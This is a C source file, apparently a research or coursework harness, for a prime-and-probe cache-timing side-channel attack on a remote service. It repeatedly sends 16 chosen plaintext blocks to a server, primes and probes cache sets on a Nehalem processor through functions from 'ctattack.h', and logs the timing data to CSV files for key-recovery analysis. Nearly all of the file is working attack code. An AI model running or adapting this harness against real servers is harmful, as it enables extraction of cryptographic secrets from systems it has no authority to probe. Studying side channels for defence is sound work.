#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/mman.h>
#include "ctattack.h"

#include <math.h>

#define RAM_ACCESS_TIME_EMPIRICAL 1000
#define REPS 100000

int main(int argc, char* argv[])
{

    char *ip_str;
    int server_port;
    int socket_desc;
    struct sockaddr_in server;
    char *message, server_reply[16];
    int times[REPS];
    FILE *fp;
    int i;
    int count = 0;

    nehalem_setup(0x38c5571a0);

    for (i = 0; i < REPS; ++i) {
        times[i] = 0;
    }



    if ((argc != 3) && (argc != 4)) {
        printf("[!]Usage: %s IP PORT [OUTFILE default: data.csv]\n", argv[0]);
        return 1;
    }
    ip_str = argv[1];
    server_port = atoi(argv[2]);
    server.sin_addr.s_addr = inet_addr(ip_str);
    server.sin_family = AF_INET;
    server.sin_port = htons( server_port );





//{'\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00', '\x00' };
    char *message_arr[16];
    message_arr[0x0] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    message_arr[0x1] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01";
    message_arr[0x2] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02";
    message_arr[0x3] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03";
    message_arr[0x4] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04";
    message_arr[0x5] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05";
    message_arr[0x6] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06";
    message_arr[0x7] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07";
    message_arr[0x8] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08";
    message_arr[0x9] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09";
    message_arr[0xa] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a";
    message_arr[0xb] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b";
    message_arr[0xc] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c";
    message_arr[0xd] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0d";
    message_arr[0xe] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0e";
    message_arr[0xf] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f";

for (int j = 0; j < 16; ++j) {

    message = message_arr[j];
    for (i = 0; i < 16; ++i) {
        printf("%02x:", message[i]);
    }
    printf("\n");

    for (count = 0; count < REPS; ++count) {

        socket_desc = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_desc == -1) { printf("Could not create socket\n"); return 1; } //printf("socket_desc: %d\n", socket_desc);
        
        //Connect to remote server
        if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");

        nehalem_prime();
        nehalem_reprime();
        //message = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04";
        //message = "aaaabbbbccccdddd";
        if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
        if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }

        times[count] = nehalem_probe();

        close(socket_desc);

    }

    for (i = 0; i < 16; ++i) {
        printf("%02x:", (unsigned char)server_reply[i]);
    }
    printf("\n");











// STATISTICS

    int Number = REPS;
    float Mean, Variance, SD, Sum=0, Differ, Varsum=0;
    int min=999999, max=0;


    for(i=0; i<Number; i++)
    {
        Sum = Sum + times[i];
        if (times[i] < min) {
            min = times[i];
        }
        if (times[i] > max) {
            max = times[i];
        }
    }
  
    Mean = Sum /(float)Number;
 
    for(i=0; i<Number; i++)
        {
        Differ = times[i] - Mean;
        Varsum = Varsum + pow(Differ,2);
    }
  
    Variance = Varsum / (float)Number;
    SD = sqrt(Variance);
  
    printf("Mean               = %.2f\n", Mean);
    printf("Varience           = %.2f\n", Variance);
    printf("Standard deviation = %.2f\n", SD);
    printf("Max                = %d\n", max);
    printf("Min                = %d\n", min);





    char dir[256];

    sprintf(dir, "data%02d.csv", j);
    

    fp = fopen((const char*)dir, "w");

    for (i = 0; i < REPS; ++i) {
        fprintf(fp, "%d\n", times[i]);
    }

    fclose(fp);



}

// EXPORTING


    char dir[256];
    dir[0] = '\0';

    if (argc == 3) {
        sprintf(dir, "%s", "data.csv");
    } else {
        sprintf(dir, "%s", argv[3]);
    }
    

    fp = fopen((const char*)dir, "w");

    for (i = 0; i < REPS; ++i) {
        fprintf(fp, "%d\n", times[i]);
    }

    fclose(fp);




    return 0;
}



